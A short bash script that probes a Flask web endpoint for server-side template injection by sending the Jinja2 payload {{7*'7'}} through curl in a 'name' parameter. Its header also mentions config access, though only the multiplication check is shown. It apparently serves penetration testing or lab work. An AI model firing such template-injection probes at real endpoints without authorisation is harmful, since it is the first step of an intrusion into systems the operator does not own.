#!/bin/bash
# Flask SSTI — Confirm Jinja2 engine via string multiplication and config access
# Usage: confirm_jinja2.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

# Jinja2 specific: string multiplication (7 * '7' = '7777777')
curl -s -G --data-urlencode "name={{7*'7'}}" "$ENDPOINT" --max-time 8
